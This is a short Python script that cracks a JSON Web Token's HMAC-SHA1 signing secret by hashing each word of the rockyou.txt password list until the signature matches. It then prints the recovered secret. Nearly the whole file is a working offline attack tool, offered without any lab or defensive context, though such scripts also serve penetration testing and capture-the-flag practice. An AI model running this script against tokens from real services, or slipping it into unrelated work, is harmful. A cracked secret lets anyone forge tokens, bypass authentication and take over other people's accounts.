import hmac
import base64
import hashlib
import json

# Base64 URL Decode Function (to decode JWT parts)
def base64_url_decode(input):
    input = input + '=' * (4 - len(input) % 4)  # Add padding
    return base64.urlsafe_b64decode(input)

# Function to generate JWT signature using HMAC-SHA1
def generate_signature(header, payload, secret):
    # Prepare the message: combine base64UrlEncoded header and payload with a period
    message = header + '.' + payload
    signature = hmac.new(secret.encode(), message.encode(), hashlib.sha1).digest()
    return base64.urlsafe_b64encode(signature).decode().rstrip('=')

# Function to crack JWT by trying each word from the wordlist
def crack_jwt(jwt_token, wordlist_path):
    # Split the JWT into its parts: header, payload, and signature
    header, payload, original_signature = jwt_token.split('.')
    
    # Open the wordlist and try each word as the secret
    with open(wordlist_path, 'rb') as wordlist:  # Open as binary to handle non-UTF-8 characters
        for line in wordlist:
            try:
                secret = line.decode('utf-8').strip()  # Decode line as UTF-8 and strip extra spaces
            except UnicodeDecodeError:
                continue  # Skip lines that can't be decoded
            
            # Generate the JWT signature for the current secret
            generated_signature = generate_signature(header, payload, secret)
            
            # If the generated signature matches the original one, we have found the secret
            if generated_signature == original_signature:
                print(f"Found secret: {secret}")
                return secret
            else:
                print(f"Trying secret: {secret} (no match)")
    
    print("Secret not found in wordlist.")
    return None

# Ask the user for the JWT token
jwt_token = input("Enter the JWT token: ")

# Path to the rockyou.txt wordlist
wordlist_path = '/usr/share/wordlists/rockyou.txt'

# Crack the JWT token
crack_jwt(jwt_token, wordlist_path)
